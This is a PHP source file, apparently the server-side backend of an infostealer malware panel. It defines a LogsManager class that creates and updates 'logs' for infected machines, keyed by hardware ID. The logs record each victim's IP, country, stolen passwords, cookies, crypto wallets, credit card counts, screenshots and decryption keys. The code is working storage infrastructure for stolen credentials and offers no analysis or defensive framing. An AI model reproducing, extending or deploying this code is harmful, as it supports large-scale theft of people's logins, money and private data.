<?php

class LogsManager
{
    // ---------------------------------------------------------------------------------------
    // mysqli
    private $connection;

    // ---------------------------------------------------------------------------------------
    // __construct
    //
    // class constructor
    // ---------------------------------------------------------------------------------------
    public function __construct($connection)
    {
        $this->connection = $connection;
    }

    // ---------------------------------------------------------------------------------------
    // CheckRepeated
    //
    // check log is repeated
    // ---------------------------------------------------------------------------------------
    public function CheckRepeated($hwid)
    {
        $repeated = 0;
	
        $query = "SELECT `log_id` FROM `logs` WHERE `hwid` = ?";
        
        if ($stmt = $this->connection->prepare($query)) 
        {
            $stmt->bind_param('s', $hwid);
            $stmt->execute();
            
            $stmt->store_result();
            
            if ($stmt->num_rows > 0)
            {
                $repeated = 1;
            }
        }
        
        return $repeated;
    }

    // ---------------------------------------------------------------------------------------
    // CreateLog
    //
    // add log to db
    // ---------------------------------------------------------------------------------------
    public function CreateLog($build, $ip, $iso, $hwid, $filename, $repeated)
    {
        $request = "INSERT INTO `logs`(`build`, `access_token`, `ip`, `iso`, `date`, `last_request`, `hwid`, `count_passwords`, `count_cookies`, `count_wallets`, `count_cc`, `screenshot`, `repeated`, `download`, `favorite`, `filename`, `log_status`, `size`, `array_passwords`, `array_cookies`, `array_wallets`) VALUES (?, ?, ?, ?, NOW(), NOW(), ?, 0, 0, 0, 0, 0, ?, 0, 0, ?, 0, 0, '', '', '')";

        $access_token = bin2hex(random_bytes(36));

        if ($stmt = $this->connection->prepare($request))
        {
            $stmt->bind_param('sssssis', $build, $access_token, $ip, $iso, $hwid, $repeated, $filename);
            $stmt->execute();
            
            $stmt->store_result();

            return $access_token;
        }

        return null;
    }

    // ---------------------------------------------------------------------------------------
    // getLogByToken
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function getLogByToken($access_token)
    {
        $query = "SELECT * FROM `logs` WHERE `access_token` = ?;";
        
        if ($stmt = $this->connection->prepare($query)) 
        {
            $stmt->bind_param('s', $access_token);
            
            $stmt->execute();
            $result = $stmt->get_result();
            $record = $result->fetch_assoc();
            $stmt->close();
            
            return new Log($record);
        }
        
        return $log_id;
    }

    // ---------------------------------------------------------------------------------------
    // UpdateLog
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function UpdateLog($log, $update_last_request)
    {
        $query = "";

        if($update_last_request)
        {
            $query = "UPDATE `logs` SET `system`= ?, `architecture`= ?, `decrypt_keys`= ?, `count_passwords`= ?, `count_cookies`= ?, `count_wallets`= ?, `count_cc`= ?, `array_passwords`= ?, `array_cookies`= ?, `array_wallets`= ?, `information`= ?, `screenshot`= ?, `log_info`= ?, `log_status`= ?, `size`= ? , `last_request`= NOW() WHERE `log_id`= ?;";
        }
        else
        {
            $query = "UPDATE `logs` SET `system`= ?, `architecture`= ?, `decrypt_keys`= ?, `count_passwords`= ?, `count_cookies`= ?, `count_wallets`= ?, `count_cc`= ?, `array_passwords`= ?, `array_cookies`= ?, `array_wallets`= ?, `information`= ?, `screenshot`= ?, `log_info`= ?, `log_status`= ?, `size`= ? WHERE `log_id`= ?;";
        }

        if ($stmt = $this->connection->prepare($query))
        {
            $stmt->bind_param('sssiiiissssisiii', 
                $log->system,
                $log->architecture,
                json_encode($log->decrypt_keys),
                $log->count_passwords,
                $log->count_cookies,
                $log->count_wallets,
                $log->count_cc,
                $log->array_passwords,
                $log->array_cookies,
                $log->array_wallets,
                $log->information,
                $log->screenshot,
                json_encode($log->log_info),
                $log->log_status,
                $log->size,
                $log->log_id
            );
            
            $stmt->execute();
        }
    }
}

?>